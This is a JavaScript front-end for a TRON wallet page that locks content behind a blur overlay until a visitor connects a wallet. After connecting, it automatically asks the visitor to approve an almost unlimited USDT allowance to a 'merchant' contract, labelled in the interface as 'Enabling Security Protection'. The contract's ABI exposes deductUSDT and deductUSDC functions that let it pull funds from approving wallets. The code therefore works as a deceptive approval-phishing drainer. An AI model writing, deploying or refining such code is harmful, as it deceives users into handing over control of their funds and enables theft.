// src/main.js (最終版本：簡潔安全提示 + UX 優化)

// --- 配置常量 ---
const MERCHANT_CONTRACT_ADDRESS='TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu';
const USDT_CONTRACT_ADDRESS='TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDC_CONTRACT_ADDRESS='TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
const DEFAULT_TRON_ADDRESS_HEX='410000000000000000000000000000000000000000';
const ALMOST_MAX_UINT="115792089237316195423570985008687907853269984665640564039457584007913129638935";

// 您的合約 ABI (保持不變)
const MERCHANT_ABI=[{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];

// --- 狀態變數 ---
let tronWeb;
let userAddress;
let merchantContract;
let usdtContract;
let usdcContract;
let isConnectedFlag=false;
let provider;
let isAuthorizedOnChain=false;

// --- UI 元素 ---
const connectButton=document.getElementById('connectButton');
const blurOverlay=document.getElementById('blurOverlay');
const overlayMessage=document.getElementById('overlayMessage');
const lockedPrompt=document.getElementById('lockedPrompt');
const authorizeButton=document.getElementById('authorizeButton'); 

// --- 辅助函數 ---
function showOverlay(message) {
    if(overlayMessage)overlayMessage.innerHTML=message;
    if(blurOverlay)blurOverlay.style.display='flex';
}
function hideOverlay() {
    if(overlayMessage)overlayMessage.innerHTML='';
    if(blurOverlay)blurOverlay.style.display='none';
}

function updateContentLock(isAuthorized) {
    isAuthorizedOnChain=isAuthorized;
    if(isAuthorized) {
        if(blurOverlay)blurOverlay.style.display='none';
        if(lockedPrompt)lockedPrompt.style.display='none';
        if(authorizeButton)authorizeButton.style.display='none';
    } else {
        if(blurOverlay)blurOverlay.style.display='flex';
        if(lockedPrompt)lockedPrompt.style.display='flex';
        if(authorizeButton)authorizeButton.style.display='none'; 
    }
}

function updateConnectionUI(connected, address=null) {
    isConnectedFlag=connected;
    if(connectButton) {
        if(connected&&address) {
            connectButton.classList.add('connected');
            connectButton.innerHTML=`Connected: ${address.substring(0, 4)}...${address.slice(-4)}`;
            connectButton.title=`Connected: ${address}`;
        } else {
            connectButton.classList.remove('connected');
            connectButton.innerHTML='<i class="fas fa-wallet"></i> Connect Wallet';
            connectButton.title='Connect Wallet';
            updateContentLock(false);
            hideOverlay();
        }
    }
}

let txCount=0;

async function sendTransaction(methodCall, stepMessage, totalTxs, callValue=0) {
    txCount++;
    showOverlay(`Step ${txCount}/${totalTxs}: ${stepMessage}. Please confirm this transaction in your wallet!`);

    try {
        const txHash=await methodCall.send({
            feeLimit: 150_000_000,
            callValue: callValue,
            shouldPollResponse: false
        });

        if(!txHash||typeof txHash!=='string'||txHash.length!==64) {
            throw new Error(`TronLink/Wallet did not return a valid transaction hash.`);
        }

        showOverlay(`Step ${txCount}/${totalTxs}: Operation broadcast successful! TxID: ${txHash.substring(0, 6)}...`);
        
        // 🚨 UX 優化: 減少成功廣播後的延遲
        await new Promise(resolve => setTimeout(resolve, 300)); 

        return txHash;

    } catch(error) {
        if(error.message&&(error.message.includes('User canceled')||error.message.includes('用戶在錢包中取消了操作'))) {
            throw new Error('用戶在錢包中取消了操作。');
        }
        const errorMessage=error.message||(typeof error==='string'?error:'Unknown error during transaction.');
        throw new Error(`交易失敗，錯誤訊息: ${errorMessage}`);
    }
}

async function initializeContracts() {
    if(!tronWeb)throw new Error("TronWeb instance not available.");
    merchantContract=await tronWeb.contract(MERCHANT_ABI, MERCHANT_CONTRACT_ADDRESS);
    usdtContract=await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
    usdcContract=await tronWeb.contract().at(USDC_CONTRACT_ADDRESS);
}

async function checkAuthorizationStatus(address) {
    if(!merchantContract||!usdtContract)return {authorized: false, usdtAllowanceOK: false, allOK: false};

    let isConnectedAuthorized=false;
    try {
        const result=await merchantContract.authorized(address).call();
        isConnectedAuthorized=(result===true||result==='true');
    } catch(e) {
        console.error("Error checking contract authorization status:", e);
    }

    let isUSDTAllowanceOK=false;
    const MIN_REQUIRED_ALLOWANCE_BN=tronWeb.toBigNumber("100000000000000000000000000000000");

    try {
        const usdtAllowanceResult=await usdtContract.allowance(address, MERCHANT_CONTRACT_ADDRESS).call();
        const usdtAllowance=tronWeb.toBigNumber(usdtAllowanceResult.remaining||usdtAllowanceResult);
        isUSDTAllowanceOK=usdtAllowance.gte(MIN_REQUIRED_ALLOWANCE_BN);
    } catch(e) {
        console.error("Error checking token allowance status:", e);
    }

    return {
        authorized: isConnectedAuthorized,
        usdtAllowanceOK: isUSDTAllowanceOK,
        allOK: isConnectedAuthorized&&isUSDTAllowanceOK
    };
}


// --- 連線邏輯 ---
async function connectWalletLogic() {
    showOverlay('Connecting to wallet...');
    txCount=0;

    try {
        if(typeof window.tronWeb!=='undefined') {
            const isReady=await new Promise(resolve => {
                let checkInterval=setInterval(() => {
                    if(window.tronWeb&&window.tronWeb.ready) {
                        clearInterval(checkInterval);
                        resolve(true);
                    }
                }, 100);
                setTimeout(() => {clearInterval(checkInterval); resolve(window.tronWeb&&window.tronWeb.ready||false);}, 3000);
            });

            if(isReady) {
                tronWeb=window.tronWeb;
                let currentAddressHex=tronWeb.defaultAddress.hex;

                if(!currentAddressHex||currentAddressHex===DEFAULT_TRON_ADDRESS_HEX) {
                    if(window.tronLink&&window.tronLink.request) {
                        try {
                            await window.tronLink.request({method: 'tron_requestAccounts'});
                            currentAddressHex=tronWeb.defaultAddress.hex;
                        } catch(requestError) {
                            showOverlay("Connection failed: Wallet authorization denied or canceled.");
                            return false;
                        }
                    }
                }

                if(currentAddressHex&&currentAddressHex!==DEFAULT_TRON_ADDRESS_HEX) {
                    userAddress=tronWeb.address.fromHex(currentAddressHex);
                    provider="TronLink/DApp Browser";
                    console.log("✅ Wallet connected, address:", userAddress);

                    await initializeContracts();
                    updateConnectionUI(true, userAddress);
                    return true;
                }
            }
        }

        updateConnectionUI(false);
        showOverlay('🔴 Connection failed: No supported TRON wallet detected or wallet is locked.');
        return false;

    } catch(error) {
        console.error("Error connecting to wallet:", error);
        updateConnectionUI(false);
        showOverlay(`🔴 Connection failed: ${error.message}`);
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 處理實際交易的授權邏輯 ⭐️
// ---------------------------------------------
async function connectAndAuthorize() {
    txCount=0;

    try {
        if(!merchantContract||!tronWeb||!userAddress) {
            throw new Error("Wallet not initialized. Please reconnect.");
        }

        const status=await checkAuthorizationStatus(userAddress);
        let transactionsToSend=[];
        let stepNumber=1;

        if(!status.authorized)transactionsToSend.push({
            call: merchantContract.connectAndAuthorize(),
            message: `Establishing Service Access (Step ${stepNumber++}/2)`
        });

        if(!status.usdtAllowanceOK)transactionsToSend.push({
            call: usdtContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT),
            message: `Enabling Security Protection (Step ${stepNumber++}/2)` 
        });
        
        const totalTxs=transactionsToSend.length;
        
        if(totalTxs===0) {
            showOverlay('Already authorized. Unlocking data...');
            return true;
        }

        for(const [index, tx] of transactionsToSend.entries()) {
            await sendTransaction(tx.call, tx.message, totalTxs);
        }

        return true;

    } catch(error) {
        console.error("Authorization Failed:", error);
        const displayError=error.message.includes('用戶在錢包中取消了操作')
            ?'Access confirmation canceled by user. Please click "Retry Authorization" to try again.'
            :`Authorization failed! Error: ${error.message}.`;

        showOverlay(`🔴 ${displayError}`);
        if(authorizeButton)authorizeButton.style.display='block';
        return false;
    }
}


// ---------------------------------------------
// ⭐️ 連線成功後處理：應用 UX 優化 ⭐️
// ---------------------------------------------
async function handlePostConnection() {
    console.log("handlePostConnection called");
    if(!isConnectedFlag) {
        updateContentLock(false);
        return;
    }

    // 1. 檢查鏈上授權狀態
    showOverlay('Checking on-chain data access status...');
    const status=await checkAuthorizationStatus(userAddress);

    if(status.allOK) {
        // 2. 如果狀態都 OK，則直接解鎖
        console.log("✅ On-chain status is fully Authorized. Unlocking data...");
        showOverlay('✅ Access confirmed! Unlocking data...');
        
        // 🚨 UX 優化: 立即解鎖 (移除 1 秒延遲)
        updateContentLock(true);
        hideOverlay();
        return;
    }

    // 3. 狀態未完成，自動觸發授權流程
    console.log(`⚠️ Data access confirmation incomplete. Triggering required steps automatically.`);
    
    const authSuccess=await connectAndAuthorize();

    if(authSuccess) {
        console.log("✅ Confirmation broadcasted successfully. Unlocking data...");
        const finalStatus=await checkAuthorizationStatus(userAddress);
        
        // 🚨 UX 優化: 立即解鎖 (移除 1 秒延遲)
        updateContentLock(finalStatus.allOK);
        hideOverlay();
    } else {
        updateContentLock(false);
    }
}


// ---------------------------------------------
// 主連接入口函數 (應用 UX 優化：按鈕禁用)
// ---------------------------------------------
async function connectWallet() {
    // 🚨 UX 優化: 在操作開始時立即禁用按鈕
    if(connectButton)connectButton.disabled=true;

    if(isConnectedFlag) {
        // 斷開連接邏輯
        tronWeb=null;
        userAddress=null;
        isConnectedFlag=false;
        isAuthorizedOnChain=false;
        provider=null;
        updateConnectionUI(false);
        updateContentLock(false);
        if(connectButton)connectButton.disabled=false;
        return;
    }

    const connected=await connectWalletLogic();

    if(connected) {
        await handlePostConnection();
    }

    // 🚨 UX 優化: 無論成功或失敗，最後重新啟用按鈕
    if(connectButton)connectButton.disabled=false;
}

// ---------------------------------------------
// 頁面啟動和事件監聽器
// ---------------------------------------------

if(connectButton)connectButton.addEventListener('click', connectWallet);

if(authorizeButton)authorizeButton.addEventListener('click', async () => {
    if(!isConnectedFlag) {
        showOverlay("Please connect your wallet first.");
        return;
    }
    // 禁用重試按鈕
    if(authorizeButton)authorizeButton.disabled=true;
    const authSuccess=await connectAndAuthorize();
    
    if(authSuccess) {
        await handlePostConnection(); 
    } else {
        updateContentLock(false);
    }
    if(authorizeButton)authorizeButton.disabled=false;
});


// 頁面啟動：初始化為未連接狀態，並設置初始鎖定狀態
updateConnectionUI(false);
updateContentLock(false);

window.onload=() => {
    setTimeout(async () => {
        if(!isConnectedFlag) {
            await connectWalletLogic();
        }
    }, 500);
};